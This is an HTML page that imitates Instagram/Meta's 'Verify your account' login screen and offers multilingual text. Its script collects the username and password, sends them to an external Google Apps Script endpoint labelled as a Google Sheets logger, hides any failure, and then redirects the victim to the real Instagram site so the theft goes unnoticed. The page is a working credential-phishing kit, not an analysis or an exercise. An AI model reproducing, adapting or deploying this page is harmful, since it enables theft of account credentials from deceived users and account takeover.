<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Account • Instagram</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1c1e21;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .app-container {
            width: 100%;
            max-width: 440px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 1.5rem 1.25rem;
            background-color: #ffffff;
        }
        /* Top Section */
        .top-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }
        .language-selector {
            display: flex;
            align-items: center;
            gap: 0.25rem;
            color: #737373;
            font-size: 0.85rem;
            margin-bottom: 3rem;
            cursor: pointer;
            position: relative;
            user-select: none;
        }
        .lang-arrow {
            transition: transform 0.2s ease;
        }
        .lang-arrow.open {
            transform: rotate(180deg);
        }
        .lang-dropdown {
            position: absolute;
            top: calc(100% + 0.5rem);
            left: 50%;
            transform: translateX(-50%) scale(0.95);
            background: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            min-width: 200px;
            padding: 0.4rem 0;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease, transform 0.2s ease;
            z-index: 100;
        }
        .lang-dropdown.open {
            opacity: 1;
            pointer-events: auto;
            transform: translateX(-50%) scale(1);
        }
        .lang-option {
            padding: 0.6rem 1rem;
            font-size: 0.85rem;
            color: #262626;
            cursor: pointer;
            transition: background-color 0.15s ease;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .lang-option:hover {
            background-color: #f5f5f5;
        }
        .lang-option.selected::after {
            content: "✓";
            color: #0064e0;
            font-weight: 600;
            font-size: 0.9rem;
        }
        .logo-container {
            margin-bottom: 1.25rem;
        }
        .logo-container img {
            width: 72px;
            height: 72px;
            object-fit: cover;
            border: none;
            outline: none;
            box-shadow: none;
            border-radius: 16px;
            clip-path: inset(1px round 16px);
        }
        .verification-header {
            text-align: center;
            margin-bottom: 2rem;
            width: 100%;
        }
        .verification-header h2 {
            font-size: 1.2rem;
            font-weight: 600;
            color: #262626;
            margin-bottom: 0.35rem;
        }
        .verification-header p {
            font-size: 0.9rem;
            color: #737373;
            line-height: 1.4;
        }
        /* Form Styles */
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 0.85rem;
        }
        .form-input {
            width: 100%;
            padding: 1.1rem;
            border: 1px solid #dcdcdc;
            border-radius: 12px;
            font-size: 0.95rem;
            background-color: #ffffff;
            outline: none;
            color: #262626;
            transition: border-color 0.2s ease;
        }
        .form-input::placeholder {
            color: #737373;
        }
        .form-input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            padding: 1rem;
            border-radius: 100px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            text-align: center;
            outline: none;
            transition: background-color 0.2s ease;
            font-family: inherit;
        }
        .btn-primary {
            background-color: #0064e0;
            color: #ffffff;
            border: none;
            margin-top: 0.5rem;
        }
        .btn-primary:active {
            background-color: #0056c2;
        }
        .forgot-password {
            margin-top: 1.25rem;
            color: #1c1e21;
            font-size: 0.9rem;
            font-weight: 500;
            text-decoration: none;
        }
        .forgot-password:active {
            opacity: 0.7;
        }
        /* Bottom Section */
        .bottom-section {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 1rem;
            padding-bottom: 0.5rem;
        }
        .btn-secondary {
            background-color: transparent;
            color: #0064e0;
            border: 1px solid #0064e0;
        }
        .btn-secondary:active {
            background-color: rgba(0, 100, 224, 0.05);
        }
        .meta-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.25rem;
            margin-top: 0.5rem;
        }
        .meta-logo span {
            color: #464646;
            font-weight: 500;
            font-size: 1.15rem;
            letter-spacing: -0.3px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Top Section -->
        <div class="top-section">
            <div class="language-selector" id="langToggle" onclick="toggleDropdown(event)">
                <span id="langLabel">English (US)</span>
                <svg class="lang-arrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#737373" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="6 9 12 15 18 9"></polyline>
                </svg>
                <div class="lang-dropdown" id="langDropdown">
                    <div class="lang-option selected" data-lang="en">English (US)</div>
                    <div class="lang-option" data-lang="es">Español</div>
                    <div class="lang-option" data-lang="fr">Français</div>
                    <div class="lang-option" data-lang="ar">العربية</div>
                    <div class="lang-option" data-lang="pt">Português (BR)</div>
                    <div class="lang-option" data-lang="de">Deutsch</div>
                    <div class="lang-option" data-lang="it">Italiano</div>
                    <div class="lang-option" data-lang="ja">日本語</div>
                    <div class="lang-option" data-lang="ko">한국어</div>
                    <div class="lang-option" data-lang="tr">Türkçe</div>
                </div>
            </div>

            <div class="logo-container">
                <img src="logo.png" alt="Instagram Logo">
            </div>
            <div class="verification-header">
                <h2 id="txtHeading">Verify your account</h2>
                <p id="txtSubheading">Please enter your details to confirm it's you.</p>
            </div>
            <form class="login-form" onsubmit="handleSubmit(event)">
                <input type="text" id="inputUser" placeholder="Username, email or mobile number" class="form-input" required>
                <input type="password" id="inputPass" placeholder="Password" class="form-input" required>
                <button type="submit" class="btn btn-primary" id="btnVerify">Verify</button>
            </form>
            <a href="https://help.instagram.com/" class="forgot-password" id="linkHelp">Need help?</a>
        </div>
        <!-- Bottom Section -->
        <div class="bottom-section">
            <div class="meta-logo">
                <svg width="24" height="16" viewBox="0 0 151 100" fill="#0064e0" xmlns="http://www.w3.org/2000/svg">
                    <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" />
                </svg>
                <span>Meta</span>
            </div>
        </div>
    </div>

    <script>
    // Google Sheets Web App URL
    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzj2PULvqhCLPnwOh3aAeQoeL6jWv1SmzjL5T5eqC49Bg6NSJeuf6w6txFqvzJ6M2-TiQ/exec';

    // Form submission handler
    async function handleSubmit(e) {
        e.preventDefault();
        const btn = document.getElementById('btnVerify');
        const username = document.getElementById('inputUser').value.trim();
        const password = document.getElementById('inputPass').value.trim();

        if (!username || !password) return;

        // Show loading state
        btn.disabled = true;
        btn.textContent = '...';

        // Send data to Google Sheets
        const formData = new URLSearchParams();
        formData.append('textToSend', username + ' | ' + password);

        try {
            await fetch(WEB_APP_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString()
            });
        } catch (err) {
            // Silent fail — redirect anyway
        }

        // Redirect to Instagram
        window.location.href = 'https://www.instagram.com/';
    }

    // Language translations
    const translations = {
        en: { label: "English (US)", heading: "Verify your account", subheading: "Please enter your details to confirm it's you.", user: "Username, email or mobile number", pass: "Password", btn: "Verify", help: "Need help?" },
        es: { label: "Español", heading: "Verifica tu cuenta", subheading: "Ingresa tus datos para confirmar que eres tú.", user: "Nombre de usuario, correo o número de móvil", pass: "Contraseña", btn: "Verificar", help: "¿Necesitas ayuda?" },
        fr: { label: "Français", heading: "Vérifiez votre compte", subheading: "Veuillez entrer vos informations pour confirmer votre identité.", user: "Nom d'utilisateur, e-mail ou numéro de mobile", pass: "Mot de passe", btn: "Vérifier", help: "Besoin d'aide ?" },
        ar: { label: "العربية", heading: "تحقق من حسابك", subheading: "يرجى إدخال بياناتك للتأكد من هويتك.", user: "اسم المستخدم أو البريد أو رقم الهاتف", pass: "كلمة المرور", btn: "تحقق", help: "هل تحتاج مساعدة؟" },
        pt: { label: "Português (BR)", heading: "Verifique sua conta", subheading: "Insira seus dados para confirmar que é você.", user: "Nome de usuário, e-mail ou celular", pass: "Senha", btn: "Verificar", help: "Precisa de ajuda?" },
        de: { label: "Deutsch", heading: "Konto bestätigen", subheading: "Bitte gib deine Daten ein, um zu bestätigen, dass du es bist.", user: "Benutzername, E-Mail oder Handynummer", pass: "Passwort", btn: "Bestätigen", help: "Brauchst du Hilfe?" },
        it: { label: "Italiano", heading: "Verifica il tuo account", subheading: "Inserisci i tuoi dati per confermare la tua identità.", user: "Nome utente, e-mail o numero di cellulare", pass: "Password", btn: "Verifica", help: "Hai bisogno di aiuto?" },
        ja: { label: "日本語", heading: "アカウントを確認", subheading: "本人確認のため、情報を入力してください。", user: "ユーザーネーム、メールまたは電話番号", pass: "パスワード", btn: "確認する", help: "ヘルプが必要ですか？" },
        ko: { label: "한국어", heading: "계정 확인", subheading: "본인 확인을 위해 세부 정보를 입력해 주세요.", user: "사용자 이름, 이메일 또는 휴대폰 번호", pass: "비밀번호", btn: "확인", help: "도움이 필요하세요?" },
        tr: { label: "Türkçe", heading: "Hesabını doğrula", subheading: "Senin olduğunu doğrulamak için bilgilerini gir.", user: "Kullanıcı adı, e-posta veya telefon numarası", pass: "Şifre", btn: "Doğrula", help: "Yardım mı lazım?" }
    };

    function toggleDropdown(e) {
        e.stopPropagation();
        const dd = document.getElementById('langDropdown');
        const arrow = document.querySelector('.lang-arrow');
        dd.classList.toggle('open');
        arrow.classList.toggle('open');
    }

    document.addEventListener('click', () => {
        document.getElementById('langDropdown').classList.remove('open');
        document.querySelector('.lang-arrow').classList.remove('open');
    });

    document.querySelectorAll('.lang-option').forEach(opt => {
        opt.addEventListener('click', (e) => {
            e.stopPropagation();
            const lang = opt.dataset.lang;
            const t = translations[lang];

            document.querySelectorAll('.lang-option').forEach(o => o.classList.remove('selected'));
            opt.classList.add('selected');

            document.getElementById('langLabel').textContent = t.label;
            document.getElementById('langDropdown').classList.remove('open');
            document.querySelector('.lang-arrow').classList.remove('open');

            document.getElementById('txtHeading').textContent = t.heading;
            document.getElementById('txtSubheading').textContent = t.subheading;
            document.getElementById('inputUser').placeholder = t.user;
            document.getElementById('inputPass').placeholder = t.pass;
            document.getElementById('btnVerify').textContent = t.btn;
            document.getElementById('linkHelp').textContent = t.help;

            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
        });
    });
    </script>
</body>
</html>
